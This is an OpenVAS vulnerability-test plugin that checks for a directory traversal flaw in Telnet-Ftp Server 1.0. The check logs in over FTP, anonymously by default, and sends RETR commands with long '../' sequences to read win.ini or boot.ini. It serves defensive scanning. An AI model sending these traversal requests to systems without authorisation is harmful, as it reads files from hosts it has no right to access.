###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_telnet_ftp_server_dir_trav_vun.nasl 9984 2018-05-28 14:36:22Z cfischer $
#
# Telnet-Ftp Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803736");
  script_version("$Revision: 9984 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-05-28 16:36:22 +0200 (Mon, 28 May 2018) $");
  script_tag(name:"creation_date", value:"2013-08-19 10:32:03 +0530 (Mon, 19 Aug 2013)");
  script_name("Telnet-Ftp Server Directory Traversal Vulnerability");

  script_tag(name : "summary" , value : "The host is running Telnet-Ftp server and is prone to directory traversal
vulnerabilities.");
  script_tag(name : "vuldetect" , value : "Send the crafted directory traversal attack request and check whether it
is able to read the system file or not.");
  script_tag(name : "solution" , value : "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name : "insight" , value : "The flaw exists due to error in handling of file names. It does not properly
sanitise filenames containing directory traversal sequences that are received
from an FTP server.");
  script_tag(name : "affected" , value : "Telnet-Ftp Server version 1.0 (Build 1.218)");
  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to read arbitrary files on the
affected application.

Impact Level: Application");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://1337day.com/exploit/20939");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/telnet-ftp-service-server-10-directory-traversal");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);

banner = get_ftp_banner(port:ftpPort);
if("220 FTP Server ready" >!< banner && "Telnet-Ftp Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user){
  user = "anonymous";
}

if(!pass){
  pass = string("anonymous");
}

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(!login_details)
{
 close(soc);
 exit(0);
}

ftpPort2 = ftp_get_pasv_port(socket:soc);
if(!ftpPort2)
{
  close(soc);
  exit(0);
}

soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2)
{
  close(soc);
  exit(0);
}

files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
foreach file (files)
{
  file = "../../../../../../../../../../../../../../../../" + file;
  attackreq = string("RETR ", file);
  send(socket:soc, data:string(attackreq, "\r\n"));

  result = ftp_recv_data(socket:soc2);

  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
                                     || "[boot loader]" >< result)
  {
    security_message(port:ftpPort);
    close(soc2);
    close(soc);
    exit(0);
  }
}

close(soc);
close(soc2);
